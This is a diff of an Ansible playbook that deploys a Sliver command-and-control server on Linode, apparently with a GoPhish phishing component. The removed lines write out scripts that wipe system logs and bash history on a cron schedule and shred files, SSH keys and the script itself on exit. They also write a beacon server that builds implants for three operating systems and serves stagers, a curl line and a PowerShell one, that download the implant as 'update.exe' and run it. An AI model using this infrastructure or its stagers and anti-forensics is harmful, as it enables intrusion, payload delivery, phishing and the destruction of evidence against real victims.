@@ -1,341 +1,112 @@
 ---
+# Linode C2 Deployment Playbook
+
 - name: Deploy Linode C2 server
   hosts: localhost
   gather_facts: false
   connection: local
+  vars_files:
+    - vars.yaml
   vars:
-    region: "{{ linode_region | default('us-east') }}"
-    instance_type: "{{ size | default('g6-standard-1') }}"
-    instance_name: "{{ c2_name | default('c2') }}"
-    domain: "{{ domain | default('example.com') }}"
-    c2_subdomain: "mail"
-    linode_image: "linode/debian11"
+    # Default values for required variables
+    ssh_user: "{{ ssh_user | default('root') }}"
+    linode_region: "{{ linode_region | default(region_choices | random) }}"
+    plan: "{{ plan | default('g6-standard-1') }}"
+    image: "{{ image | default('linode/debian11') }}"
+    
+    # Generate random instance name if not provided
+    c2_name: "{{ c2_name | default('node-' + 9999999999 | random | to_uuid | hash('md5') | truncate(8, True, '')) }}"
 
   tasks:
-    - name: Create Linode C2 instance
+    - name: Validate required Linode token
+      assert:
+        that:
+          - linode_token is defined and linode_token != ""
+        fail_msg: "Linode API token is required. Set linode_token in vars.yaml or via --linode-token."
+
+    - name: Create C2 Linode instance
       community.general.linode_v4:
-        label: "{{ instance_name }}"
-        type: "{{ instance_type }}"
-        region: "{{ region }}"
-        image: "{{ linode_image }}"
+        access_token: "{{ linode_token }}"
+        label: "{{ c2_name }}"
+        type: "{{ plan }}"
+        region: "{{ linode_region }}"
+        image: "{{ image }}"
         root_pass: "{{ lookup('password', '/dev/null length=24 chars=ascii_letters,digits') }}"
-        authorized_keys: 
-          - "{{ lookup('file', ssh_key) }}"
+        authorized_keys:
+          - "{{ lookup('file', ssh_key_path) }}"
         state: present
       register: c2_instance
 
-    - name: Save C2 IP
+    - name: Set c2_ip for later use
       set_fact:
         c2_ip: "{{ c2_instance.instance.ipv4[0] }}"
+        c2_instance_id: "{{ c2_instance.instance.id }}"
 
-    - name: Wait for SSH to become available
+    - name: Wait for C2 SSH to be available
       wait_for:
         host: "{{ c2_ip }}"
         port: 22
-        delay: 10
+        delay: 30
         timeout: 300
         state: started
 
-    - name: Add C2 server to inventory
+    - name: Add C2 to inventory
       add_host:
-        name: c2
+        name: "c2"
+        groups: "c2servers"
         ansible_host: "{{ c2_ip }}"
-        ansible_user: "{{ ssh_user | default('root') }}"
-        ansible_ssh_private_key_file: "{{ ssh_key | replace('.pub', '') }}"
-        groups: c2servers
+        ansible_user: "{{ ssh_user }}"
+        ansible_ssh_private_key_file: "{{ ssh_key_path | replace('.pub', '') }}"
+        ansible_ssh_common_args: "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
 
 - name: Configure C2 server
   hosts: c2servers
   become: true
+  gather_facts: true
+  vars_files:
+    - vars.yaml
   vars:
-    domain: "{{ domain | default('example.com') }}"
-    c2_subdomain: "mail"
-    letsencrypt_email: "{{ letsencrypt_email | default('admin@example.com') }}"
-    zero_logs: "{{ zero_logs | default(true) }}"
-    redirector_ip: "{{ hostvars['localhost']['redirector_ip'] | default('127.0.0.1') }}"
-
+    redirector_ip: "{{ redirector_ip | default('127.0.0.1') }}"
+    c2_subdomain: "{{ c2_subdomain | default('mail') }}"
   tasks:
-    - name: Update apt cache
+    - name: Wait for apt to be available
       apt:
         update_cache: yes
-
-    - name: Install required packages
-      apt:
-        name:
-          - git
-          - wget
-          - curl
-          - python3-pip
-          - golang
-          - tmux
-          - nmap
-          - jq
-          - secure-delete
-          - socat
+      register: apt_result
+      until: apt_result is success
+      retries: 5
+      delay: 10
+    
+    - name: Disable root password authentication for SSH immediately
+      lineinfile:
+        path: /etc/ssh/sshd_config
+        regexp: '^#?PasswordAuthentication'
+        line: 'PasswordAuthentication no'
         state: present
+      
+    - name: Restart SSH service to apply changes
+      service:
+        name: ssh
+        state: restarted
 
-    - name: Create directories for C2 operation
-      file:
-        path: "{{ item }}"
-        state: directory
-        mode: '0700'
-        owner: root
-        group: root
-      with_items:
-        - /opt/c2
-        - /opt/beacons
-        - /opt/payloads
-
-    - name: Create clean-logs.sh script
-      copy:
-        content: |
-          #!/bin/bash
-          # Zero-logs maintenance script
-          umask 077
-
-          # Disable syslog temporarily
-          systemctl stop rsyslog 2>/dev/null
-          systemctl stop systemd-journald 2>/dev/null
-
-          # Clear system logs
-          find /var/log -type f -name "*.log" -exec truncate -s 0 {} \;
-          find /var/log -type f -name "auth.log*" -exec truncate -s 0 {} \;
-          find /var/log -type f -name "syslog*" -exec truncate -s 0 {} \;
-          journalctl --vacuum-time=1s 2>/dev/null
-          
-          # Clear bash history
-          for histfile in /root/.bash_history /home/*/.bash_history; do
-              [ -f "$histfile" ] && cat /dev/null > "$histfile" 2>/dev/null
-          done
-          history -c
-          
-          # Clear Sliver logs
-          find /root/.sliver/logs -type f -exec cat /dev/null > {} \; 2>/dev/null
-          
-          # Clear temporary directories
-          rm -rf /tmp/* /var/tmp/* 2>/dev/null
-          
-          # Restart logging services
-          systemctl start systemd-journald 2>/dev/null
-          systemctl start rsyslog 2>/dev/null
-          
-          echo "[+] Log cleaning complete"
-          exit 0
-        dest: /opt/c2/clean-logs.sh
-        mode: '0700'
-        owner: root
-        group: root
-
-    - name: Create secure-exit.sh script
-      copy:
-        content: |
-          #!/bin/bash
-          # Secure cleanup script
-          
-          # Configuration
-          SECURE_DELETE_PASSES=7
-          MEMORY_WIPE=true
-          
-          # Set secure umask
-          umask 077
-          
-          # Function to securely delete files
-          secure_delete() {
-              local target=$1
-              echo "[+] Securely deleting: $target"
-              
-              if command -v srm > /dev/null; then
-                  srm -vzf $target 2>/dev/null
-              elif command -v shred > /dev/null; then
-                  shred -vzfn $SECURE_DELETE_PASSES $target 2>/dev/null
-              else
-                  # Fallback to dd if specialized tools aren't available
-                  dd if=/dev/urandom of=$target bs=1M count=10 conv=notrunc 2>/dev/null
-                  dd if=/dev/zero of=$target bs=1M count=10 conv=notrunc 2>/dev/null
-                  rm -f $target 2>/dev/null
-              fi
-          }
-          
-          echo "[+] Beginning secure exit procedure..."
-          
-          # Stop all operational services
-          echo "[+] Stopping operational services..."
-          services=("sliver")
-          for service in "${services[@]}"; do
-              systemctl stop $service 2>/dev/null
-          done
-          
-          # Kill any remaining operational processes
-          echo "[+] Terminating operational processes..."
-          process_names=("sliver" "nc" "python")
-          for proc in "${process_names[@]}"; do
-              pkill -9 $proc 2>/dev/null
-          done
-          
-          # Clear all logs
-          echo "[+] Clearing logs..."
-          bash /opt/c2/clean-logs.sh
-          
-          # Securely delete operational files
-          echo "[+] Removing operational files..."
-          operational_dirs=(
-              "/opt/c2"
-              "/opt/beacons"
-              "/opt/payloads"
-              "/root/.sliver"
-          )
-          
-          for dir in "${operational_dirs[@]}"; do
-              find $dir -type f 2>/dev/null | while read file; do
-                  secure_delete "$file"
-              done
-              rm -rf $dir 2>/dev/null
-          done
-          
-          # Remove SSH keys
-          echo "[+] Removing SSH keys and configs..."
-          find /home/*/.ssh /root/.ssh -type f 2>/dev/null | while read file; do
-              secure_delete "$file"
-          done
-          
-          # Clean memory if requested
-          if $MEMORY_WIPE; then
-              echo "[+] Wiping system memory..."
-              sync
-              echo 3 > /proc/sys/vm/drop_caches
-              swapoff -a
-              swapon -a
-          fi
-          
-          echo "[+] Secure exit completed. Infrastructure has been sanitized."
-          
-          # Remove this script itself
-          exec shred -n $SECURE_DELETE_PASSES -uz $0
-        dest: /opt/c2/secure-exit.sh
-        mode: '0700'
-        owner: root
-        group: root
-
-    - name: Create beacon-server.sh script
-      copy:
-        content: |
-          #!/bin/bash
-          # Beacon server script
-          
-          # Configuration
-          BEACONS_DIR="/opt/beacons"
-          WEBSERVER_PORT=8443
-          
-          # Set secure umask
-          umask 077
-          
-          # Ensure beacons directory exists
-          mkdir -p $BEACONS_DIR
-          
-          # Generate beacons using Sliver
-          echo "[+] Generating beacons for all platforms..."
-          
-          # Make sure Sliver server is running
-          if ! pgrep -x "sliver-server" > /dev/null; then
-              echo "[!] Sliver server is not running, starting it..."
-              systemctl start sliver
-              sleep 5
-          fi
-          
-          # Generate Windows beacon
-          sliver-cli generate --http {{ ansible_host }}:8888 --os windows --arch amd64 --save $BEACONS_DIR/windows.exe
-          
-          # Generate Linux beacon
-          sliver-cli generate --http {{ ansible_host }}:8888 --os linux --arch amd64 --save $BEACONS_DIR/linux
-          
-          # Generate macOS beacon
-          sliver-cli generate --http {{ ansible_host }}:8888 --os darwin --arch amd64 --save $BEACONS_DIR/macos
-          
-          # Generate stagers
-          echo "#!/bin/bash
-          curl -s {{ ansible_host }}:8443/linux | chmod +x && ./linux" > $BEACONS_DIR/beacon.sh
-          chmod +x $BEACONS_DIR/beacon.sh
-          
-          echo "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
-          \$url = 'http://{{ ansible_host }}:8443/windows.exe';
-          \$outpath = \"\$env:TEMP\\update.exe\";
-          Invoke-WebRequest -Uri \$url -OutFile \$outpath;
-          Start-Process -NoNewWindow -FilePath \$outpath;" > $BEACONS_DIR/beacon.ps1
-          
-          echo "[+] All beacons generated successfully"
-          
-          # Serve beacons using Python's HTTP server
-          echo "[+] Starting HTTP server on port $WEBSERVER_PORT..."
-          cd $BEACONS_DIR
-          python3 -m http.server $WEBSERVER_PORT --bind 0.0.0.0 &
-          SERVER_PID=$!
-          
-          echo "[+] Beacon server started with PID $SERVER_PID"
-          echo "[+] Beacons available at http://{{ ansible_host }}:$WEBSERVER_PORT/"
-          
-          # Keep script running
-          trap "kill $SERVER_PID; echo '[+] Beacon server stopped'; exit 0" INT
-          while true; do sleep 1; done
-        dest: /opt/c2/beacon-server.sh
-        mode: '0700'
-        owner: root
-        group: root
-
-    - name: Install Sliver C2 framework
-      shell: |
-        curl https://sliver.sh/install | bash
-      args:
-        creates: /usr/local/bin/sliver-server
-
-    - name: Create Sliver service file
-      copy:
-        content: |
-          [Unit]
-          Description=Sliver C2 Server
-          After=network.target
-          
-          [Service]
-          Type=simple
-          User=root
-          Group=root
-          WorkingDirectory=/root/.sliver
-          ExecStart=/usr/local/bin/sliver-server daemon
-          Restart=always
-          RestartSec=10
-          
-          # Security measures
-          PrivateTmp=true
-          ProtectHome=false
-          NoNewPrivileges=true
-          
-          # Hide process information
-          StandardOutput=null
-          StandardError=null
-          
-          [Install]
-          WantedBy=multi-user.target
-        dest: /etc/systemd/system/sliver.service
-        mode: '0644'
-        owner: root
-        group: root
-
-    - name: Start and enable Sliver service
-      systemd:
-        name: sliver
-        state: started
-        enabled: yes
-        daemon_reload: yes
-
-    - name: Set up cron job for log cleaning
-      cron:
-        name: "Clean logs"
-        minute: "0"
-        hour: "*/6"
-        job: "/opt/c2/clean-logs.sh > /dev/null 2>&1"
-      when: zero_logs|bool
-
-    - name: Start beacon server
-      shell: |
-        nohup /opt/c2/beacon-server.sh > /dev/null 2>&1 &
-      args:
-        creates: /opt/beacons/windows.exe
+    - name: Include common tool installation tasks
+      include_tasks: "../tasks/install_tools.yml"
+      
+    - name: Include common C2 configuration tasks
+      include_tasks: "../tasks/configure_c2.yml"
+      
+    - name: Include common security hardening tasks
+      include_tasks: "../tasks/security_hardening.yml"
+      
+    - name: Include common mail server configuration tasks
+      include_tasks: "../tasks/configure_mail.yml"
+      
+    - name: Print deployment summary
+      debug:
+        msg:
+          - "C2 Server Deployment Complete!"
+          - "-----------------------------"
+          - "C2 Server IP: {{ ansible_host }}"
+          - "C2 Server Domain: {{ c2_subdomain }}.{{ domain }} (Update DNS A record)"
+          - "GoPhish Admin Port: {{ gophish_admin_port }}"
+      when: not disable_summary | default(false)
